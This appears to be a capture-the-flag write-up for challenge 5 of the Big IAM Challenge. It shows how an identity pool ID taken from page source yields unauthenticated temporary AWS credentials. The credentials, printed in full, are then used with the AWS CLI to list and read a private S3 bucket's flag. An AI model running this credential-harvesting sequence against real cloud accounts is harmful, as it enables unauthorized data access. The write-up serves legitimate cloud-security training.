# Challenge 5

**Challenge 5:** https://bigiamchallenge.com/challenge/5

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/d845a952-6fee-43c8-a298-b192a1edee4b)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/ab739629-f041-446f-aa59-16d35b18c4ac)

View page source:

  AWS.config.region = 'us-east-1';
  
  AWS.config.credentials = new AWS.CognitoIdentityCredentials({IdentityPoolId: "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"});

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/42f2bb75-520d-49ec-b46b-8f13cfd261f4)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/aa71ec99-f2c4-4990-9247-8f298c34c4a4)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/70216e9e-2214-4462-bafa-d29440230e17)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/1d721aae-464c-42c6-a71f-ec746dcc017f)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/f84f1903-c172-4fce-aad8-63a4009a6d58)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/36d49e26-8ad6-404f-b9ef-9e066d6e7272)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/0fb4ca25-0bb0-448f-a25e-8d2f59d4594d)

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "VisualEditor0",
            "Effect": "Allow",
            "Action": [
                "mobileanalytics:PutEvents",
                "cognito-sync:*"
            ],
            "Resource": "*"
        },
        {
            "Sid": "VisualEditor1",
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::wiz-privatefiles",
                "arn:aws:s3:::wiz-privatefiles/*"
            ]
        }
    ]
}
```


```
  AWS.config.region = 'us-east-1';
  AWS.config.credentials = new AWS.CognitoIdentityCredentials({IdentityPoolId: "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"});
  // Set the region
  AWS.config.update({region: 'us-east-1'});

  $(document).ready(function() {
    var s3 = new AWS.S3();
    params = {
      Bucket: 'wiz-privatefiles',
      Key: 'cognito1.png',
      Expires: 60 * 60
    }

    signedUrl = s3.getSignedUrl('getObject', params, function (err, url) {
      $('#signedImg').attr('src', url);
    });
});
```


```
> aws cognito-identity get-id --identity-pool-id "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
{
    "IdentityId": "us-east-1:157d6171-ee03-cc80-bb71-4ec6614f125c"
}
> aws cognito-identity get-credentials-for-identity --identity-id "us-east-1:157d6171-ee03-cc80-bb71-4ec6614f125c"
{
    "IdentityId": "us-east-1:157d6171-ee03-cc80-bb71-4ec6614f125c",
    "Credentials": {
        "AccessKeyId": "ASIARK7LBOHXGB3O3NFZ",
        "SecretKey": "TighCKdXx6bopej9bLuCmF3qIcdcaKNdcTGIOyjD",
        "SessionToken": "IQoJb3JpZ2luX2VjEAAaCXVzLWVhc3QtMSJHMEUCIQDdienZX/NRVp1AO7mxnchDITSQ3/o07BdnBHEtjBLOdwIgcOBmy6n0F+TrW2dqaXMMuCYUuGMzRRBV5HOvURd/GGQq0wUIif//////////ARAAGgwwOTIyOTc4NTEzNzQiDPwXEdIHwQilCVA6mSqnBXlaGZD3aomWP741nk89KHJ6LqlHqTTWwcWMlbxre6i4xxKfEcp6Fd7ybwf51taIhzP0TtOvIVg5ddGgRweDtdggMcuXxlNL3LTtLNENQMHv6XbvEDTwT3KS+cTpBUHzGbd80icwqStqAsjqw191nsMDgalEzGHsf7YY5/0Kl+9L4TWDxSMZAZjgyvfaSqimmseDai39dlPV7HoLYX8/qftsj+y31lDPhLo7AUKHvI75SlOSJKd4FcC4zQcqrt0nIO+7ZlI2Y3zCIa4zxILC0pGOcs8Gp0XDtMnCkieszJslMYSDp5uh2Z51mM4OLF9HYDXCIIy0cK1PHIobYJ1/OvZCM0aSZK8gjH8PG4Joe3AUmq5rydQJcNJX+R32HRUHQXsYpExYqS0xF/1On6O60Kzl2Lkv1tT+0Zn4BJjwMyNLJ9c0zKUfBL2/VFs05Cwp5JeXmPiLr6dkZhF9yUSuZlMcS6v59S32sarVuAP+3mBrDPGGIEzia0wjFyVolp0mnrImpK+O0W2/LMHmvz+ILflVZCGMU/tNixk+m31VfuQcC5fTUeObXejGs2/XAnEOaDJRUai1/fvJVCi2wLOQncyAHmq7zwAYqqugPgaX0JC5oYn+fXExrwOic7cdH+q55wZfouPcBWZrYhnuU0tOjn2LgiHPojXSzPTE2YR2cug9XR+EKlp9hR2hjpAmEvp50O42exeT8XRsvrrxTC31611LU8T4Z0hiHqB1yC0ee7znqdCUocXSsV4wkXIxsspCoD4bCIHYMtuzAE2pZ+mBG1Th0SraV0sCqnVfLTl9pnanaJJUcuXm162RG39WqY6TKRfnOjgO69eeLa29YrZoOjsgucpLlD2sOD/8maLgdGSSS157QmBnIfXhVv33l37UrGJ3gLAcjrMw8ej1sgY63AKGVAxVnktgptlDmoQdAIc6xvXAJzTU+yImWXtSTZgm6K0/q/3eaCdQ8tO8vgw5fSN8wGF4GNRLkYeCPdjjFQ7LMfeGtQsXNr88YoVfLw22sCeBR/l34rVE5XNjsHUfoBC+iqh9GFST4y1bFSs8CQfs9okEp5jIxWEk89X9w9ZzrTijhh1lDnjP5/7rDxv9yapSOmPn7GMhOAJrPqc19VAqmSBl0l+qBAYhC+66xXG76Q8pFODi188/eIDf1fI7qrnwXdWrZYfcMwoCcve3M+b4P0GVGqMupo/wMcMWjx2Jy90sIcjqXwb51f2W473Aw6UHKvl6+PXibVK947JcsPLg55G1HP39YffNubdKhyi4n2zc0cVPfJvkqUgU5DFaddh+mLZbNSPL8wywOz/Rrt5d2qG/+bc+ifgE3RZKBnJJtVmUORXlhQ9Y6rsFuRL4mliKECKhBBPubYkATkQ=",
        "Expiration": 1717404289.0
    }
}
```

**Alternatively**, you can try **export** credentials on linux or macos and **set** credentials on windows:

```
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $nano ~/.aws/credentials
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $tail -n 4 ~/.aws/credentials
[challenge5]
AWS_ACCESS_KEY_ID=ASIARK7LBOHXGB3O3NFZ
AWS_SECRET_ACCESS_KEY=TighCKdXx6bopej9bLuCmF3qIcdcaKNdcTGIOyjD
AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEAAaCXVzLWVhc3QtMSJHMEUCIQDdienZX/NRVp1AO7mxnchDITSQ3/o07BdnBHEtjBLOdwIgcOBmy6n0F+TrW2dqaXMMuCYUuGMzRRBV5HOvURd/GGQq0wUIif//////////ARAAGgwwOTIyOTc4NTEzNzQiDPwXEdIHwQilCVA6mSqnBXlaGZD3aomWP741nk89KHJ6LqlHqTTWwcWMlbxre6i4xxKfEcp6Fd7ybwf51taIhzP0TtOvIVg5ddGgRweDtdggMcuXxlNL3LTtLNENQMHv6XbvEDTwT3KS+cTpBUHzGbd80icwqStqAsjqw191nsMDgalEzGHsf7YY5/0Kl+9L4TWDxSMZAZjgyvfaSqimmseDai39dlPV7HoLYX8/qftsj+y31lDPhLo7AUKHvI75SlOSJKd4FcC4zQcqrt0nIO+7ZlI2Y3zCIa4zxILC0pGOcs8Gp0XDtMnCkieszJslMYSDp5uh2Z51mM4OLF9HYDXCIIy0cK1PHIobYJ1/OvZCM0aSZK8gjH8PG4Joe3AUmq5rydQJcNJX+R32HRUHQXsYpExYqS0xF/1On6O60Kzl2Lkv1tT+0Zn4BJjwMyNLJ9c0zKUfBL2/VFs05Cwp5JeXmPiLr6dkZhF9yUSuZlMcS6v59S32sarVuAP+3mBrDPGGIEzia0wjFyVolp0mnrImpK+O0W2/LMHmvz+ILflVZCGMU/tNixk+m31VfuQcC5fTUeObXejGs2/XAnEOaDJRUai1/fvJVCi2wLOQncyAHmq7zwAYqqugPgaX0JC5oYn+fXExrwOic7cdH+q55wZfouPcBWZrYhnuU0tOjn2LgiHPojXSzPTE2YR2cug9XR+EKlp9hR2hjpAmEvp50O42exeT8XRsvrrxTC31611LU8T4Z0hiHqB1yC0ee7znqdCUocXSsV4wkXIxsspCoD4bCIHYMtuzAE2pZ+mBG1Th0SraV0sCqnVfLTl9pnanaJJUcuXm162RG39WqY6TKRfnOjgO69eeLa29YrZoOjsgucpLlD2sOD/8maLgdGSSS157QmBnIfXhVv33l37UrGJ3gLAcjrMw8ej1sgY63AKGVAxVnktgptlDmoQdAIc6xvXAJzTU+yImWXtSTZgm6K0/q/3eaCdQ8tO8vgw5fSN8wGF4GNRLkYeCPdjjFQ7LMfeGtQsXNr88YoVfLw22sCeBR/l34rVE5XNjsHUfoBC+iqh9GFST4y1bFSs8CQfs9okEp5jIxWEk89X9w9ZzrTijhh1lDnjP5/7rDxv9yapSOmPn7GMhOAJrPqc19VAqmSBl0l+qBAYhC+66xXG76Q8pFODi188/eIDf1fI7qrnwXdWrZYfcMwoCcve3M+b4P0GVGqMupo/wMcMWjx2Jy90sIcjqXwb51f2W473Aw6UHKvl6+PXibVK947JcsPLg55G1HP39YffNubdKhyi4n2zc0cVPfJvkqUgU5DFaddh+mLZbNSPL8wywOz/Rrt5d2qG/+bc+ifgE3RZKBnJJtVmUORXlhQ9Y6rsFuRL4mliKECKhBBPubYkATkQ=
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws sts get-caller-identity --profile challenge5
{
    "UserId": "AROARK7LBOHXJKAIRDRIU:CognitoIdentityCredentials",
    "Account": "092297851374",
    "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessUnauth_Role/CognitoIdentityCredentials"
}
```

**Method 1:**

```
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws s3api list-objects --bucket wiz-privatefiles
{
    "Contents": [
        {
            "Key": "cognito1.png",
            "LastModified": "2023-06-05T19:42:27.000Z",
            "ETag": "\"539693e3b6f41aa7545e9f8965c3cadd\"",
            "Size": 4220,
            "StorageClass": "STANDARD",
            "Owner": {
                "DisplayName": "shir+ctf",
                "ID": "37ec5af87b339325fbafa92e65fbd5f5ab4bcd7e733fa76838720554da48d3f9"
            }
        },
        {
            "Key": "flag1.txt",
            "LastModified": "2023-06-05T13:28:35.000Z",
            "ETag": "\"20fcd58d8bdd4d81814b501230a94727\"",
            "Size": 37,
            "StorageClass": "STANDARD",
            "Owner": {
                "DisplayName": "shir+ctf",
                "ID": "37ec5af87b339325fbafa92e65fbd5f5ab4bcd7e733fa76838720554da48d3f9"
            }
        }
    ],
    "RequestCharged": null
}
```

```
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws s3api get-object --bucket wiz-privatefiles --key flag1.txt flag5.txt
{
    "AcceptRanges": "bytes",
    "LastModified": "Mon, 05 Jun 2023 13:28:35 GMT",
    "ContentLength": 37,
    "ETag": "\"20fcd58d8bdd4d81814b501230a94727\"",
    "ContentType": "text/plain",
    "ServerSideEncryption": "AES256",
    "Metadata": {}
}
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $cat flag5.txt 
{wiz:incognito-is-always-suspicious}
```

**Method 2:**

```
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws s3 ls s3://wiz-privatefiles
2023-06-06 01:12:27       4220 cognito1.png
2023-06-05 18:58:35         37 flag1.txt
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws s3 cp s3://wiz-privatefiles/flag1.txt -
{wiz:incognito-is-always-suspicious}
```
